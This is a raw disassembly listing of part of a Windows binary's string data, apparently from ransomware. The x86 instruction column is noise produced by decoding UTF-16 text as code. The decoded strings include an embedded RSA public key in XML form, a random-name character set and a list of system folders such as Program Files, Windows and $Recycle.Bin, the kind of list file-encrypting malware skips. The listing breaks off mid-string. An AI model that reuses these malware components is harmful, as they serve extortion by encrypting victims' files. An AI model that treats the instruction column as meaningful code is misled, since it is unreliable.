  40587a:	00 70 00             	add    %dh,0x0(%eax)
  40587d:	3a 00                	cmp    (%eax),%al
  40587f:	2f                   	das
  405880:	00 2f                	add    %ch,(%edi)
  405882:	00 77 00             	add    %dh,0x0(%edi)
  405885:	77 00                	ja     0x405887
  405887:	77 00                	ja     0x405889
  405889:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  40588d:	33 00                	xor    (%eax),%eax
  40588f:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  405893:	72 00                	jb     0x405895
  405895:	67 00 2f             	add    %ch,(%bx)
  405898:	00 32                	add    %dh,(%edx)
  40589a:	00 30                	add    %dh,(%eax)
  40589c:	00 30                	add    %dh,(%eax)
  40589e:	00 31                	add    %dh,(%ecx)
  4058a0:	00 2f                	add    %ch,(%edi)
  4058a2:	00 58 00             	add    %bl,0x0(%eax)
  4058a5:	4d                   	dec    %ebp
  4058a6:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  4058aa:	00 63 00             	add    %ah,0x0(%ebx)
  4058ad:	68 00 65 00 6d       	push   $0x6d006500
  4058b2:	00 61 00             	add    %ah,0x0(%ecx)
  4058b5:	22 00                	and    (%eax),%al
  4058b7:	20 00                	and    %al,(%eax)
  4058b9:	78 00                	js     0x4058bb
  4058bb:	6d                   	insl   (%dx),%es:(%edi)
  4058bc:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  4058c0:	00 73 00             	add    %dh,0x0(%ebx)
  4058c3:	3a 00                	cmp    (%eax),%al
  4058c5:	78 00                	js     0x4058c7
  4058c7:	73 00                	jae    0x4058c9
  4058c9:	69 00 3d 00 22 00    	imul   $0x22003d,(%eax),%eax
  4058cf:	68 00 74 00 74       	push   $0x74007400
  4058d4:	00 70 00             	add    %dh,0x0(%eax)
  4058d7:	3a 00                	cmp    (%eax),%al
  4058d9:	2f                   	das
  4058da:	00 2f                	add    %ch,(%edi)
  4058dc:	00 77 00             	add    %dh,0x0(%edi)
  4058df:	77 00                	ja     0x4058e1
  4058e1:	77 00                	ja     0x4058e3
  4058e3:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  4058e7:	33 00                	xor    (%eax),%eax
  4058e9:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  4058ed:	72 00                	jb     0x4058ef
  4058ef:	67 00 2f             	add    %ch,(%bx)
  4058f2:	00 32                	add    %dh,(%edx)
  4058f4:	00 30                	add    %dh,(%eax)
  4058f6:	00 30                	add    %dh,(%eax)
  4058f8:	00 31                	add    %dh,(%ecx)
  4058fa:	00 2f                	add    %ch,(%edi)
  4058fc:	00 58 00             	add    %bl,0x0(%eax)
  4058ff:	4d                   	dec    %ebp
  405900:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  405904:	00 63 00             	add    %ah,0x0(%ebx)
  405907:	68 00 65 00 6d       	push   $0x6d006500
  40590c:	00 61 00             	add    %ah,0x0(%ecx)
  40590f:	2d 00 69 00 6e       	sub    $0x6e006900,%eax
  405914:	00 73 00             	add    %dh,0x0(%ebx)
  405917:	74 00                	je     0x405919
  405919:	61                   	popa
  40591a:	00 6e 00             	add    %ch,0x0(%esi)
  40591d:	63 00                	arpl   %eax,(%eax)
  40591f:	65 00 22             	add    %ah,%gs:(%edx)
  405922:	00 3e                	add    %bh,(%esi)
  405924:	00 01                	add    %al,(%ecx)
  405926:	37                   	aaa
  405927:	20 00                	and    %al,(%eax)
  405929:	20 00                	and    %al,(%eax)
  40592b:	3c 00                	cmp    $0x0,%al
  40592d:	45                   	inc    %ebp
  40592e:	00 78 00             	add    %bh,0x0(%eax)
  405931:	70 00                	jo     0x405933
  405933:	6f                   	outsl  %ds:(%esi),(%dx)
  405934:	00 6e 00             	add    %ch,0x0(%esi)
  405937:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40593b:	74 00                	je     0x40593d
  40593d:	3e 00 41 00          	add    %al,%ds:0x0(%ecx)
  405941:	51                   	push   %ecx
  405942:	00 41 00             	add    %al,0x0(%ecx)
  405945:	42                   	inc    %edx
  405946:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405949:	2f                   	das
  40594a:	00 45 00             	add    %al,0x0(%ebp)
  40594d:	78 00                	js     0x40594f
  40594f:	70 00                	jo     0x405951
  405951:	6f                   	outsl  %ds:(%esi),(%dx)
  405952:	00 6e 00             	add    %ch,0x0(%esi)
  405955:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405959:	74 00                	je     0x40595b
  40595b:	3e 00 00             	add    %al,%ds:(%eax)
  40595e:	82 db 20             	sbb    $0x20,%bl
  405961:	00 20                	add    %ah,(%eax)
  405963:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405966:	4d                   	dec    %ebp
  405967:	00 6f 00             	add    %ch,0x0(%edi)
  40596a:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40596e:	6c                   	insb   (%dx),%es:(%edi)
  40596f:	00 75 00             	add    %dh,0x0(%ebp)
  405972:	73 00                	jae    0x405974
  405974:	3e 00 32             	add    %dh,%ds:(%edx)
  405977:	00 31                	add    %dh,(%ecx)
  405979:	00 72 00             	add    %dh,0x0(%edx)
  40597c:	39 00                	cmp    %eax,(%eax)
  40597e:	37                   	aaa
  40597f:	00 36                	add    %dh,(%esi)
  405981:	00 51 00             	add    %dl,0x0(%ecx)
  405984:	55                   	push   %ebp
  405985:	00 38                	add    %bh,(%eax)
  405987:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40598b:	00 45 00             	add    %al,0x0(%ebp)
  40598e:	67 00 56 00          	add    %dl,0x0(%bp)
  405992:	69 00 43 00 33 00    	imul   $0x330043,(%eax),%eax
  405998:	6e                   	outsb  %ds:(%esi),(%dx)
  405999:	00 73 00             	add    %dh,0x0(%ebx)
  40599c:	47                   	inc    %edi
  40599d:	00 4d 00             	add    %cl,0x0(%ebp)
  4059a0:	64 00 30             	add    %dh,%fs:(%eax)
  4059a3:	00 4d 00             	add    %cl,0x0(%ebp)
  4059a6:	38 00                	cmp    %al,(%eax)
  4059a8:	41                   	inc    %ecx
  4059a9:	00 41 00             	add    %al,0x0(%ecx)
  4059ac:	67 00 66 00          	add    %ah,0x0(%bp)
  4059b0:	6d                   	insl   (%dx),%es:(%edi)
  4059b1:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  4059b5:	00 55 00             	add    %dl,0x0(%ebp)
  4059b8:	2b 00                	sub    (%eax),%eax
  4059ba:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  4059be:	37                   	aaa
  4059bf:	00 36                	add    %dh,(%esi)
  4059c1:	00 65 00             	add    %ah,0x0(%ebp)
  4059c4:	4c                   	dec    %esp
  4059c5:	00 53 00             	add    %dl,0x0(%ebx)
  4059c8:	35 00 34 00 35       	xor    $0x35003400,%eax
  4059cd:	00 4a 00             	add    %cl,0x0(%edx)
  4059d0:	58                   	pop    %eax
  4059d1:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  4059d5:	00 4e 00             	add    %cl,0x0(%esi)
  4059d8:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  4059dc:	56                   	push   %esi
  4059dd:	00 4f 00             	add    %cl,0x0(%edi)
  4059e0:	50                   	push   %eax
  4059e1:	00 4d 00             	add    %cl,0x0(%ebp)
  4059e4:	4c                   	dec    %esp
  4059e5:	00 6f 00             	add    %ch,0x0(%edi)
  4059e8:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  4059ec:	6d                   	insl   (%dx),%es:(%edi)
  4059ed:	00 62 00             	add    %ah,0x0(%edx)
  4059f0:	63 00                	arpl   %eax,(%eax)
  4059f2:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4059f6:	38 00                	cmp    %al,(%eax)
  4059f8:	35 00 7a 00 6b       	xor    $0x6b007a00,%eax
  4059fd:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  405a01:	00 39                	add    %bh,(%ecx)
  405a03:	00 76 00             	add    %dh,0x0(%esi)
  405a06:	70 00                	jo     0x405a08
  405a08:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  405a0c:	41                   	inc    %ecx
  405a0d:	00 70 00             	add    %dh,0x0(%eax)
  405a10:	31 00                	xor    %eax,(%eax)
  405a12:	38 00                	cmp    %al,(%eax)
  405a14:	4f                   	dec    %edi
  405a15:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  405a19:	00 55 00             	add    %dl,0x0(%ebp)
  405a1c:	70 00                	jo     0x405a1e
  405a1e:	6a 00                	push   $0x0
  405a20:	2f                   	das
  405a21:	00 30                	add    %dh,(%eax)
  405a23:	00 4d 00             	add    %cl,0x0(%ebp)
  405a26:	37                   	aaa
  405a27:	00 33                	add    %dh,(%ebx)
  405a29:	00 6a 00             	add    %ch,0x0(%edx)
  405a2c:	34 00                	xor    $0x0,%al
  405a2e:	37                   	aaa
  405a2f:	00 41 00             	add    %al,0x0(%ecx)
  405a32:	4c                   	dec    %esp
  405a33:	00 67 00             	add    %ah,0x0(%edi)
  405a36:	32 00                	xor    (%eax),%al
  405a38:	33 00                	xor    (%eax),%eax
  405a3a:	30 00                	xor    %al,(%eax)
  405a3c:	30 00                	xor    %al,(%eax)
  405a3e:	41                   	inc    %ecx
  405a3f:	00 63 00             	add    %ah,0x0(%ebx)
  405a42:	59                   	pop    %ecx
  405a43:	00 70 00             	add    %dh,0x0(%eax)
  405a46:	62 00                	bound  %eax,(%eax)
  405a48:	6d                   	insl   (%dx),%es:(%edi)
  405a49:	00 6a 00             	add    %ch,0x0(%edx)
  405a4c:	58                   	pop    %eax
  405a4d:	00 37                	add    %dh,(%edi)
  405a4f:	00 68 00             	add    %ch,0x0(%eax)
  405a52:	45                   	inc    %ebp
  405a53:	00 76 00             	add    %dh,0x0(%esi)
  405a56:	76 00                	jbe    0x405a58
  405a58:	41                   	inc    %ecx
  405a59:	00 4a 00             	add    %cl,0x0(%edx)
  405a5c:	30 00                	xor    %al,(%eax)
  405a5e:	75 00                	jne    0x405a60
  405a60:	71 00                	jno    0x405a62
  405a62:	57                   	push   %edi
  405a63:	00 32                	add    %dh,(%edx)
  405a65:	00 47 00             	add    %al,0x0(%edi)
  405a68:	4d                   	dec    %ebp
  405a69:	00 37                	add    %dh,(%edi)
  405a6b:	00 41 00             	add    %al,0x0(%ecx)
  405a6e:	75 00                	jne    0x405a70
  405a70:	72 00                	jb     0x405a72
  405a72:	47                   	inc    %edi
  405a73:	00 42 00             	add    %al,0x0(%edx)
  405a76:	5a                   	pop    %edx
  405a77:	00 71 00             	add    %dh,0x0(%ecx)
  405a7a:	4a                   	dec    %edx
  405a7b:	00 7a 00             	add    %bh,0x0(%edx)
  405a7e:	32 00                	xor    (%eax),%al
  405a80:	69 00 4b 00 4f 00    	imul   $0x4f004b,(%eax),%eax
  405a86:	69 00 56 00 78 00    	imul   $0x780056,(%eax),%eax
  405a8c:	4c                   	dec    %esp
  405a8d:	00 56 00             	add    %dl,0x0(%esi)
  405a90:	54                   	push   %esp
  405a91:	00 63 00             	add    %ah,0x0(%ebx)
  405a94:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  405a98:	63 00                	arpl   %eax,(%eax)
  405a9a:	31 00                	xor    %eax,(%eax)
  405a9c:	74 00                	je     0x405a9e
  405a9e:	4d                   	dec    %ebp
  405a9f:	00 75 00             	add    %dh,0x0(%ebp)
  405aa2:	63 00                	arpl   %eax,(%eax)
  405aa4:	48                   	dec    %eax
  405aa5:	00 6a 00             	add    %ch,0x0(%edx)
  405aa8:	4f                   	dec    %edi
  405aa9:	00 6a 00             	add    %ch,0x0(%edx)
  405aac:	55                   	push   %ebp
  405aad:	00 4f 00             	add    %cl,0x0(%edi)
  405ab0:	39 00                	cmp    %eax,(%eax)
  405ab2:	70 00                	jo     0x405ab4
  405ab4:	76 00                	jbe    0x405ab6
  405ab6:	4f                   	dec    %edi
  405ab7:	00 48 00             	add    %cl,0x0(%eax)
  405aba:	73 00                	jae    0x405abc
  405abc:	70 00                	jo     0x405abe
  405abe:	64 00 35 00 65 00 31 	add    %dh,%fs:0x31006500
  405ac5:	00 33                	add    %dh,(%ebx)
  405ac7:	00 2b                	add    %ch,(%ebx)
  405ac9:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  405acd:	00 43 00             	add    %al,0x0(%ebx)
  405ad0:	54                   	push   %esp
  405ad1:	00 32                	add    %dh,(%edx)
  405ad3:	00 68 00             	add    %ch,0x0(%eax)
  405ad6:	2f                   	das
  405ad7:	00 58 00             	add    %bl,0x0(%eax)
  405ada:	34 00                	xor    $0x0,%al
  405adc:	6b 00 78             	imul   $0x78,(%eax),%eax
  405adf:	00 59 00             	add    %bl,0x0(%ecx)
  405ae2:	6f                   	outsl  %ds:(%esi),(%dx)
  405ae3:	00 50 00             	add    %dl,0x0(%eax)
  405ae6:	59                   	pop    %ecx
  405ae7:	00 6e 00             	add    %ch,0x0(%esi)
  405aea:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  405aee:	2f                   	das
  405aef:	00 50 00             	add    %dl,0x0(%eax)
  405af2:	55                   	push   %ebp
  405af3:	00 48 00             	add    %cl,0x0(%eax)
  405af6:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  405afa:	69 00 37 00 77 00    	imul   $0x770037,(%eax),%eax
  405b00:	6b 00 48             	imul   $0x48,(%eax),%eax
  405b03:	00 6e 00             	add    %ch,0x0(%esi)
  405b06:	47                   	inc    %edi
  405b07:	00 55 00             	add    %dl,0x0(%ebp)
  405b0a:	44                   	inc    %esp
  405b0b:	00 68 00             	add    %ch,0x0(%eax)
  405b0e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b0f:	00 37                	add    %dh,(%edi)
  405b11:	00 77 00             	add    %dh,0x0(%edi)
  405b14:	72 00                	jb     0x405b16
  405b16:	4d                   	dec    %ebp
  405b17:	00 2b                	add    %ch,(%ebx)
  405b19:	00 7a 00             	add    %bh,0x0(%edx)
  405b1c:	62 00                	bound  %eax,(%eax)
  405b1e:	7a 00                	jp     0x405b20
  405b20:	72 00                	jb     0x405b22
  405b22:	4d                   	dec    %ebp
  405b23:	00 6b 00             	add    %ch,0x0(%ebx)
  405b26:	76 00                	jbe    0x405b28
  405b28:	48                   	dec    %eax
  405b29:	00 39                	add    %bh,(%ecx)
  405b2b:	00 73 00             	add    %dh,0x0(%ebx)
  405b2e:	48                   	dec    %eax
  405b2f:	00 5a 00             	add    %bl,0x0(%edx)
  405b32:	33 00                	xor    (%eax),%eax
  405b34:	47                   	inc    %edi
  405b35:	00 43 00             	add    %al,0x0(%ebx)
  405b38:	56                   	push   %esi
  405b39:	00 70 00             	add    %dh,0x0(%eax)
  405b3c:	38 00                	cmp    %al,(%eax)
  405b3e:	69 00 6a 00 61 00    	imul   $0x61006a,(%eax),%eax
  405b44:	78 00                	js     0x405b46
  405b46:	33 00                	xor    (%eax),%eax
  405b48:	2f                   	das
  405b49:	00 62 00             	add    %ah,0x0(%edx)
  405b4c:	42                   	inc    %edx
  405b4d:	00 6b 00             	add    %ch,0x0(%ebx)
  405b50:	5a                   	pop    %edx
  405b51:	00 68 00             	add    %ch,0x0(%eax)
  405b54:	4b                   	dec    %ebx
  405b55:	00 72 00             	add    %dh,0x0(%edx)
  405b58:	5a                   	pop    %edx
  405b59:	00 39                	add    %bh,(%ecx)
  405b5b:	00 5a 00             	add    %bl,0x0(%edx)
  405b5e:	32 00                	xor    (%eax),%al
  405b60:	55                   	push   %ebp
  405b61:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  405b65:	00 58 00             	add    %bl,0x0(%eax)
  405b68:	32 00                	xor    (%eax),%al
  405b6a:	6a 00                	push   $0x0
  405b6c:	47                   	inc    %edi
  405b6d:	00 33                	add    %dh,(%ebx)
  405b6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405b72:	71 00                	jno    0x405b74
  405b74:	67 00 43 00          	add    %al,0x0(%bp,%di)
  405b78:	46                   	inc    %esi
  405b79:	00 70 00             	add    %dh,0x0(%eax)
  405b7c:	6e                   	outsb  %ds:(%esi),(%dx)
  405b7d:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  405b81:	00 47 00             	add    %al,0x0(%edi)
  405b84:	57                   	push   %edi
  405b85:	00 39                	add    %bh,(%ecx)
  405b87:	00 67 00             	add    %ah,0x0(%edi)
  405b8a:	78 00                	js     0x405b8c
  405b8c:	58                   	pop    %eax
  405b8d:	00 36                	add    %dh,(%esi)
  405b8f:	00 39                	add    %bh,(%ecx)
  405b91:	00 2f                	add    %ch,(%edi)
  405b93:	00 6a 00             	add    %ch,0x0(%edx)
  405b96:	62 00                	bound  %eax,(%eax)
  405b98:	34 00                	xor    $0x0,%al
  405b9a:	35 00 55 00 53       	xor    $0x53005500,%eax
  405b9f:	00 32                	add    %dh,(%edx)
  405ba1:	00 65 00             	add    %ah,0x0(%ebp)
  405ba4:	72 00                	jb     0x405ba6
  405ba6:	33 00                	xor    (%eax),%eax
  405ba8:	30 00                	xor    %al,(%eax)
  405baa:	64 00 42 00          	add    %al,%fs:0x0(%edx)
  405bae:	69 00 2b 00 6d 00    	imul   $0x6d002b,(%eax),%eax
  405bb4:	55                   	push   %ebp
  405bb5:	00 43 00             	add    %al,0x0(%ebx)
  405bb8:	42                   	inc    %edx
  405bb9:	00 2f                	add    %ch,(%edi)
  405bbb:	00 37                	add    %dh,(%edi)
  405bbd:	00 4f 00             	add    %cl,0x0(%edi)
  405bc0:	5a                   	pop    %edx
  405bc1:	00 76 00             	add    %dh,0x0(%esi)
  405bc4:	45                   	inc    %ebp
  405bc5:	00 37                	add    %dh,(%edi)
  405bc7:	00 6f 00             	add    %ch,0x0(%edi)
  405bca:	2b 00                	sub    (%eax),%eax
  405bcc:	48                   	dec    %eax
  405bcd:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  405bd1:	00 42 00             	add    %al,0x0(%edx)
  405bd4:	66 00 42 00          	data16 add %al,0x0(%edx)
  405bd8:	44                   	inc    %esp
  405bd9:	00 2f                	add    %ch,(%edi)
  405bdb:	00 76 00             	add    %dh,0x0(%esi)
  405bde:	45                   	inc    %ebp
  405bdf:	00 39                	add    %bh,(%ecx)
  405be1:	00 69 00             	add    %ch,0x0(%ecx)
  405be4:	55                   	push   %ebp
  405be5:	00 69 00             	add    %ch,0x0(%ecx)
  405be8:	46                   	inc    %esi
  405be9:	00 58 00             	add    %bl,0x0(%eax)
  405bec:	42                   	inc    %edx
  405bed:	00 39                	add    %bh,(%ecx)
  405bef:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  405bf3:	00 61 00             	add    %ah,0x0(%ecx)
  405bf6:	61                   	popa
  405bf7:	00 75 00             	add    %dh,0x0(%ebp)
  405bfa:	46                   	inc    %esi
  405bfb:	00 41 00             	add    %al,0x0(%ecx)
  405bfe:	2f                   	das
  405bff:	00 73 00             	add    %dh,0x0(%ebx)
  405c02:	56                   	push   %esi
  405c03:	00 6f 00             	add    %ch,0x0(%edi)
  405c06:	49                   	dec    %ecx
  405c07:	00 63 00             	add    %ah,0x0(%ebx)
  405c0a:	4d                   	dec    %ebp
  405c0b:	00 63 00             	add    %ah,0x0(%ebx)
  405c0e:	63 00                	arpl   %eax,(%eax)
  405c10:	52                   	push   %edx
  405c11:	00 41 00             	add    %al,0x0(%ecx)
  405c14:	5a                   	pop    %edx
  405c15:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  405c19:	00 69 00             	add    %ch,0x0(%ecx)
  405c1c:	35 00 64 00 51       	xor    $0x51006400,%eax
  405c21:	00 3d 00 3d 00 3c    	add    %bh,0x3c003d00
  405c27:	00 2f                	add    %ch,(%edi)
  405c29:	00 4d 00             	add    %cl,0x0(%ebp)
  405c2c:	6f                   	outsl  %ds:(%esi),(%dx)
  405c2d:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  405c31:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  405c35:	00 73 00             	add    %dh,0x0(%ebx)
  405c38:	3e 00 00             	add    %al,%ds:(%eax)
  405c3b:	21 3c 00             	and    %edi,(%eax,%eax,1)
  405c3e:	2f                   	das
  405c3f:	00 52 00             	add    %dl,0x0(%edx)
  405c42:	53                   	push   %ebx
  405c43:	00 41 00             	add    %al,0x0(%ecx)
  405c46:	50                   	push   %eax
  405c47:	00 61 00             	add    %ah,0x0(%ecx)
  405c4a:	72 00                	jb     0x405c4c
  405c4c:	61                   	popa
  405c4d:	00 6d 00             	add    %ch,0x0(%ebp)
  405c50:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  405c55:	00 72 00             	add    %dh,0x0(%edx)
  405c58:	73 00                	jae    0x405c5a
  405c5a:	3e 00 00             	add    %al,%ds:(%eax)
  405c5d:	80 8b 61 00 62 00 63 	orb    $0x63,0x620061(%ebx)
  405c64:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  405c68:	00 66 00             	add    %ah,0x0(%esi)
  405c6b:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  405c6f:	69 00 6a 00 6b 00    	imul   $0x6b006a,(%eax),%eax
  405c75:	6c                   	insb   (%dx),%es:(%edi)
  405c76:	00 6d 00             	add    %ch,0x0(%ebp)
  405c79:	6e                   	outsb  %ds:(%esi),(%dx)
  405c7a:	00 6f 00             	add    %ch,0x0(%edi)
  405c7d:	70 00                	jo     0x405c7f
  405c7f:	71 00                	jno    0x405c81
  405c81:	72 00                	jb     0x405c83
  405c83:	73 00                	jae    0x405c85
  405c85:	74 00                	je     0x405c87
  405c87:	75 00                	jne    0x405c89
  405c89:	76 00                	jbe    0x405c8b
  405c8b:	77 00                	ja     0x405c8d
  405c8d:	78 00                	js     0x405c8f
  405c8f:	79 00                	jns    0x405c91
  405c91:	7a 00                	jp     0x405c93
  405c93:	41                   	inc    %ecx
  405c94:	00 42 00             	add    %al,0x0(%edx)
  405c97:	43                   	inc    %ebx
  405c98:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  405c9c:	00 46 00             	add    %al,0x0(%esi)
  405c9f:	47                   	inc    %edi
  405ca0:	00 48 00             	add    %cl,0x0(%eax)
  405ca3:	49                   	dec    %ecx
  405ca4:	00 4a 00             	add    %cl,0x0(%edx)
  405ca7:	4b                   	dec    %ebx
  405ca8:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  405cac:	00 4e 00             	add    %cl,0x0(%esi)
  405caf:	4f                   	dec    %edi
  405cb0:	00 50 00             	add    %dl,0x0(%eax)
  405cb3:	51                   	push   %ecx
  405cb4:	00 52 00             	add    %dl,0x0(%edx)
  405cb7:	53                   	push   %ebx
  405cb8:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  405cbc:	00 56 00             	add    %dl,0x0(%esi)
  405cbf:	57                   	push   %edi
  405cc0:	00 58 00             	add    %bl,0x0(%eax)
  405cc3:	59                   	pop    %ecx
  405cc4:	00 5a 00             	add    %bl,0x0(%edx)
  405cc7:	31 00                	xor    %eax,(%eax)
  405cc9:	32 00                	xor    (%eax),%al
  405ccb:	33 00                	xor    (%eax),%eax
  405ccd:	34 00                	xor    $0x0,%al
  405ccf:	35 00 36 00 37       	xor    $0x37003600,%eax
  405cd4:	00 38                	add    %bh,(%eax)
  405cd6:	00 39                	add    %bh,(%ecx)
  405cd8:	00 30                	add    %dh,(%eax)
  405cda:	00 2a                	add    %ch,(%edx)
  405cdc:	00 21                	add    %ah,(%ecx)
  405cde:	00 3d 00 26 00 3f    	add    %bh,0x3f002600
  405ce4:	00 26                	add    %ah,(%esi)
  405ce6:	00 2f                	add    %ch,(%edi)
  405ce8:	00 00                	add    %al,(%eax)
  405cea:	03 2e                	add    (%esi),%ebp
  405cec:	00 00                	add    %al,(%eax)
  405cee:	03 3f                	add    (%edi),%edi
  405cf0:	00 00                	add    %al,(%eax)
  405cf2:	1b 50 00             	sbb    0x0(%eax),%edx
  405cf5:	72 00                	jb     0x405cf7
  405cf7:	6f                   	outsl  %ds:(%esi),(%dx)
  405cf8:	00 67 00             	add    %ah,0x0(%edi)
  405cfb:	72 00                	jb     0x405cfd
  405cfd:	61                   	popa
  405cfe:	00 6d 00             	add    %ch,0x0(%ebp)
  405d01:	20 00                	and    %al,(%eax)
  405d03:	46                   	inc    %esi
  405d04:	00 69 00             	add    %ch,0x0(%ecx)
  405d07:	6c                   	insb   (%dx),%es:(%edi)
  405d08:	00 65 00             	add    %ah,0x0(%ebp)
  405d0b:	73 00                	jae    0x405d0d
  405d0d:	00 27                	add    %ah,(%edi)
  405d0f:	50                   	push   %eax
  405d10:	00 72 00             	add    %dh,0x0(%edx)
  405d13:	6f                   	outsl  %ds:(%esi),(%dx)
  405d14:	00 67 00             	add    %ah,0x0(%edi)
  405d17:	72 00                	jb     0x405d19
  405d19:	61                   	popa
  405d1a:	00 6d 00             	add    %ch,0x0(%ebp)
  405d1d:	20 00                	and    %al,(%eax)
  405d1f:	46                   	inc    %esi
  405d20:	00 69 00             	add    %ch,0x0(%ecx)
  405d23:	6c                   	insb   (%dx),%es:(%edi)
  405d24:	00 65 00             	add    %ah,0x0(%ebp)
  405d27:	73 00                	jae    0x405d29
  405d29:	20 00                	and    %al,(%eax)
  405d2b:	28 00                	sub    %al,(%eax)
  405d2d:	78 00                	js     0x405d2f
  405d2f:	38 00                	cmp    %al,(%eax)
  405d31:	36 00 29             	add    %ch,%ss:(%ecx)
  405d34:	00 00                	add    %al,(%eax)
  405d36:	0f 57 00             	xorps  (%eax),%xmm0
  405d39:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  405d3f:	6f                   	outsl  %ds:(%esi),(%dx)
  405d40:	00 77 00             	add    %dh,0x0(%edi)
  405d43:	73 00                	jae    0x405d45
  405d45:	00 19                	add    %bl,(%ecx)
  405d47:	24 00                	and    $0x0,%al
  405d49:	52                   	push   %edx
  405d4a:	00 65 00             	add    %ah,0x0(%ebp)
  405d4d:	63 00                	arpl   %eax,(%eax)
  405d4f:	79 00                	jns    0x405d51
  405d51:	63 00                	arpl   %eax,(%eax)
  405d53:	6c                   	insb   (%dx),%es:(%edi)
  405d54:	00 65 00             	add    %ah,0x0(%ebp)
  405d57:	2e 00 42 00          	add    %al,%cs:0x0(%edx)
  405d5b:	69 00 6e 00 00 11    	imul   $0x1100006e,(%eax),%eax
  405d61:	4d                   	dec    %ebp
  405d62:	00 53 00             	add    %dl,0x0(%ebx)
  405d65:	4f                   	dec    %edi
  405d66:	00 43 00             	add    %al,0x0(%ebx)
  405d69:	61                   	popa
  405d6a:	00 63 00             	add    %ah,0x0(%ebx)
  405d6d:	68 00 65 00 00       	push   $0x6500
  405d72:	2d 44 00 6f 00       	sub    $0x6f0044,%eax
  405d77:	63 00                	arpl   %eax,(%eax)
  405d79:	75 00                	jne    0x405d7b
  405d7b:	6d                   	insl   (%dx),%es:(%edi)
  405d7c:	00 65 00             	add    %ah,0x0(%ebp)
  405d7f:	6e                   	outsb  %ds:(%esi),(%dx)
  405d80:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  405d84:	00 20                	add    %ah,(%eax)
  405d86:	00 61 00             	add    %ah,0x0(%ecx)
  405d89:	6e                   	outsb  %ds:(%esi),(%dx)
  405d8a:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  405d8e:	00 53 00             	add    %dl,0x0(%ebx)
  405d91:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  405d96:	00 69 00             	add    %ch,0x0(%ecx)
  405d99:	6e                   	outsb  %ds:(%esi),(%dx)
  405d9a:	00 67 00             	add    %ah,0x0(%edi)
  405d9d:	73 00                	jae    0x405d9f
  405d9f:	00 0b                	add    %cl,(%ebx)
  405da1:	49                   	dec    %ecx
  405da2:	00 6e 00             	add    %ch,0x0(%esi)
  405da5:	74 00                	je     0x405da7
  405da7:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
  405dac:	11 50 00             	adc    %edx,0x0(%eax)
  405daf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405db3:	66 00 4c 00 6f       	data16 add %cl,0x6f(%eax,%eax,1)
  405db8:	00 67 00             	add    %ah,0x0(%edi)
  405dbb:	73 00                	jae    0x405dbd
  405dbd:	00 17                	add    %dl,(%edi)
  405dbf:	57                   	push   %edi
  405dc0:	00 69 00             	add    %ch,0x0(%ecx)
  405dc3:	6e                   	outsb  %ds:(%esi),(%dx)
  405dc4:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  405dc8:	00 77 00             	add    %dh,0x0(%edi)
  405dcb:	73 00                	jae    0x405dcd
  405dcd:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  405dd1:	6c                   	insb   (%dx),%es:(%edi)
  405dd2:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  405dd6:	07                   	pop    %es
  405dd7:	41                   	inc    %ecx
  405dd8:	00 4d 00             	add    %cl,0x0(%ebp)
  405ddb:	44                   	inc    %esp
  405ddc:	00 00                	add    %al,(%eax)
  405dde:	0d 4e 00 56 00       	or     $0x56004e,%eax
  405de3:	49                   	dec    %ecx
  405de4:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  405de8:	00 41 00             	add    %al,0x0(%ecx)
  405deb:	00 17                	add    %dl,(%edi)
  405ded:	50                   	push   %eax
  405dee:	00 72 00             	add    %dh,0x0(%edx)
  405df1:	6f                   	outsl  %ds:(%esi),(%dx)
  405df2:	00 67 00             	add    %ah,0x0(%edi)
  405df5:	72 00                	jb     0x405df7
  405df7:	61                   	popa
  405df8:	00 6d 00             	add    %ch,0x0(%ebp)
  405dfb:	44                   	inc    %esp
